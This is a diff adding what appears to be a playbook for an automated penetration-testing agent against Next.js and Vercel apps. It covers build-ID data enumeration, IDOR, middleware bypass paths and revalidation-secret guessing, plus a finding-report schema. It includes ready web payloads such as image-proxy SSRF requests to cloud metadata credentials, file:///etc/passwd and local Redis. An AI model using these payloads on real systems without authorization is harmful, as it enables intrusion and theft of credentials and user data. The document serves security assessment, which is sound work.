@@ -1,0 +1,189 @@
+SCOPE: Next.js and Vercel-hosted applications — enumerate build artifacts, server-side rendering leaks, middleware bypass paths, image proxy misuse, Route Handler authorization gaps, and ISR cache poisoning.
+
+## TARGETS
+
+- `/_next/static/` — compiled JS chunks, CSS, and static assets
+- `/_next/data/<buildId>/` — SSG/SSR data JSON files mirroring page routes
+- `/_next/image` — built-in image optimization proxy
+- `/api/` — API Routes (Pages Router) and Route Handlers (App Router)
+- `/__nextjs_original-stack-frames` — source map stack trace endpoint (dev only, sometimes left on)
+- `/.next/` — build output directory (occasionally served if static hosting is misconfigured)
+- `/.well-known/vercel` — Vercel deployment metadata
+- `/_vercel/insights/` — Vercel Web Analytics script injection point
+- `/api/_next/data` — internal Next.js data fetching proxy pattern
+- Server Actions: forms posting to the same page URL with `Next-Action` header
+
+## TECHNIQUES
+
+1. **_next/data buildId enumeration for SSR data exfiltration**
+   Next.js serves pre-rendered page data at `/_next/data/<buildId>/<route>.json`. The `buildId` is embedded in every page's HTML in a `<script id="__NEXT_DATA__">` tag and in `/_next/static/chunks/pages/_app*.js`. Once you have the buildId, any authenticated-page data route can be requested directly — bypassing UI-layer access control if the API route itself lacks auth.
+
+   ```
+   # Extract buildId from page HTML:
+   curl -s https://app.example.com/ | grep -o '"buildId":"[^"]*"'
+   # → "buildId":"Abc123XyZ"
+
+   # Enumerate data routes:
+   GET /_next/data/Abc123XyZ/admin/users.json
+   GET /_next/data/Abc123XyZ/dashboard/settings.json
+   GET /_next/data/Abc123XyZ/account/billing.json
+
+   200 OK
+   {"pageProps":{"users":[{"id":1,"email":"admin@example.com","role":"superadmin"}]}}
+   ```
+
+   Map all routes from the JS bundle (look for `router.push`, `<Link href=`, `getServerSideProps` exports) and probe their corresponding `.json` paths.
+
+2. **_next/image SSRF via url parameter**
+   The built-in image optimization endpoint accepts a `url` query parameter. If `remotePatterns` or `domains` config is too permissive, or the app uses a catch-all pattern, it acts as an open proxy.
+
+   ```
+   GET /_next/image?url=https://internal-service.corp/admin/config&w=32&q=75
+   GET /_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=32&q=75
+   GET /_next/image?url=file:///etc/passwd&w=32&q=75
+   GET /_next/image?url=http://localhost:6379/&w=32&q=75   (Redis banner)
+   ```
+
+   Also test for open redirect: if the image proxy returns a redirect, some clients follow it to non-image URLs. Probe with a URL that issues a 302 to an attacker-controlled host.
+
+   Additionally test unvalidated external domains by substituting known-allowed hosts with CNAME-redirected attacker domains.
+
+3. **Server Action endpoint enumeration and IDOR**
+   App Router Server Actions post to the same page URL with the `Next-Action` header containing a hash of the action. Actions are not meant to be called without the form, but they are standard POST endpoints. Enumerate action hashes from the JS bundle (search for `"use server"` compiled artifacts, look for `registerServerReference` calls).
+
+   ```
+   POST /dashboard/settings
+   Next-Action: <action-hash-from-bundle>
+   Content-Type: multipart/form-data; boundary=----NextFormBoundary
+   ------NextFormBoundary
+   Content-Disposition: form-data; name="userId"
+
+   <victim-user-id>
+   ------NextFormBoundary--
+   ```
+
+   Test whether actions validate that the caller owns the resource. Try substituting other users' IDs or escalating to admin actions.
+
+4. **Middleware bypass via path normalization**
+   Next.js middleware runs on the Edge Runtime and matches paths with `matcher` config. Path normalization differences between the middleware matcher and the Node.js server mean some paths bypass middleware entirely.
+
+   Common bypasses:
+   ```
+   /admin/../admin/users     → normalizes to /admin/users, may skip middleware
+   /admin%2Fusers            → URL-encoded slash, may not match middleware pattern
+   /ADMIN/users              → case difference if middleware uses exact match
+   /admin/users/             → trailing slash variant
+   /api/admin/users%00       → null byte (crashes some matchers)
+   /api/admin/users?_rsc=1   → RSC (React Server Component) request variant
+   ```
+
+   Test each variant against protected routes. If the middleware redirects to login but the bypass path returns the actual page, it's a finding.
+
+5. **getServerSideProps IDOR through _next/data**
+   Pages using `getServerSideProps` serve their props at `/_next/data/<buildId>/<route>.json`. If `getServerSideProps` fetches data based on a URL parameter (e.g., `/orders/[orderId]`) without verifying ownership:
+
+   ```
+   GET /_next/data/Abc123XyZ/orders/9999.json
+
+   {"pageProps":{"order":{"id":9999,"userId":7,"items":[...],"total":1299.99,"address":"..."}}}
+   ```
+
+   Enumerate IDs sequentially. This is IDOR through the data layer rather than the rendered page.
+
+6. **ISR (Incremental Static Regeneration) cache poisoning**
+   ISR pages regenerate on a `revalidate` interval or on-demand via revalidation tokens. If the on-demand revalidation endpoint (`/api/revalidate?secret=<token>&path=<path>`) leaks or has a weak secret, an attacker can poison cached pages by triggering revalidation while simultaneously feeding malicious data (requires SSRF or compromised data source), or force stale content to persist.
+
+   ```
+   # Probe revalidation endpoint with common secrets:
+   GET /api/revalidate?secret=mysecret&path=/
+   GET /api/revalidate?secret=NEXT_PUBLIC_REVALIDATE_SECRET&path=/admin
+   GET /api/revalidate?secret=&path=/
+
+   200 OK — {"revalidated":true}   ← secret was empty or guessed
+   ```
+
+   Also test `?tag=` param variants for tag-based invalidation.
+
+7. **Route Handler authorization gap (App Router)**
+   App Router Route Handlers (`app/api/route.ts`, `app/dashboard/api/route.ts`) are Next.js API endpoints but are sometimes assumed to be unreachable from the outside because they live under protected directory structures. They are always publicly accessible. Test every `route.ts` file discovered in the bundle for missing auth checks.
+
+   ```
+   GET /dashboard/api/export-data
+   # (no auth header)
+
+   200 OK
+   {"users":[...],"revenue":...}
+   ```
+
+   Map all `route.ts` paths from the JS chunk manifest (`/_next/static/chunks/app/`). Look for `GET`, `POST`, `DELETE` handlers that perform privileged operations.
+
+8. **__NEXT_DATA__ / __next_f RSC payload information disclosure**
+   App Router pages stream React Server Component (RSC) payloads. These payloads contain the full serialized server-side props including data that was meant to be filtered before sending to the client. Inspect `__next_f` script tags and RSC stream chunks for sensitive fields.
+
+   ```
+   # RSC request (React Server Component fetch):
+   GET /dashboard
+   RSC: 1
+   Next-Router-State-Tree: [...]
+
+   # Response contains serialized RSC chunks:
+   0:["$","div",null,{"children":["$","$L1",null,{"user":{"id":1,"email":"admin@example.com","passwordHash":"$2b$..."}}]}]
+   ```
+
+   Also check `__NEXT_DATA__` script block on SSR pages for fields not visible in the UI.
+
+9. **.well-known/vercel and deployment metadata**
+   Vercel deployments expose metadata including deployment ID, environment, project name, and git commit SHA at `/.well-known/vercel`. This enables targeted reconnaissance.
+
+   ```
+   GET /.well-known/vercel
+
+   {"deploymentId":"dpl_Abc123","projectId":"prj_XyZ789","projectName":"acme-app","env":"production","gitCommitSha":"abc123def456"}
+   ```
+
+   Use the commit SHA to find the public repository, read source code, extract secrets from commit history, or diff the deployed code against the repository to identify changes not yet merged.
+
+10. **Source map exposure**
+    Next.js sometimes leaves `.map` files accessible in production. JS source maps expose original TypeScript/JSX source code including inline comments, debug logic, and hardcoded values.
+
+    ```
+    GET /_next/static/chunks/pages/index.js.map
+
+    {"version":3,"sources":["../pages/index.tsx"],"sourcesContent":["const API_KEY = 'sk_live_...'\n// TODO: remove hardcoded admin bypass\n..."]}
+    ```
+
+    Also check `/_next/static/css/*.css.map` and look for references to source file paths that reveal project structure.
+
+11. **Next.js development mode leakage in production**
+    Some Next.js deployments accidentally run in development mode (`NODE_ENV=development`). This enables: detailed error pages with full stack traces, `/__nextjs_original-stack-frames` source map stack reconstruction, and HMR WebSocket at `/_next/webpack-hmr`.
+
+    ```
+    GET /__nextjs_original-stack-frames
+
+    200 OK — dev mode active (not 404)
+    ```
+
+    In dev mode, trigger a server-side error (e.g., send invalid input to a data-fetching route) and inspect the error overlay response for file paths, environment variables in stack frames, and source code excerpts.
+
+12. **API route HTTP method override**
+    Next.js API routes (Pages Router) handle methods via `req.method`. If the handler only checks for `GET` and `POST` but not other verbs, try `HEAD`, `OPTIONS`, `PUT`, `PATCH`, `DELETE` — some handlers fall through to a default that performs privileged operations.
+
+    ```
+    DELETE /api/users/profile
+    Authorization: Bearer <attacker-token>
+
+    200 OK — {"deleted": true, "userId": "<victim-id>"}   ← if handler doesn't check method properly
+    ```
+
+## WHAT TO RECORD
+
+When calling `mantis_record_finding`, populate:
+
+- `title`: e.g. "Next.js _next/data IDOR exposes admin user list", "_next/image SSRF via unvalidated url parameter"
+- `severity`: `critical` (auth bypass, SSRF to metadata), `high` (PII exposure via _next/data or RSC payload), `medium` (source maps, build artifact exposure), `low` (metadata disclosure)
+- `url`: exact URL including buildId, query parameters
+- `method`: HTTP method
+- `request_headers`: include `RSC: 1` or `Next-Action` headers where relevant
+- `response_body_excerpt`: the sensitive data returned (first 500 bytes)
+- `evidence_notes`: explain whether the issue is a framework default, misconfiguration, or missing auth check; note the Next.js version if determinable from `/__next_data__` or package.json exposure
+- `cwe`: CWE-918 (SSRF); CWE-200 (Information Exposure); CWE-639 (IDOR); CWE-284 (Improper Access Control)
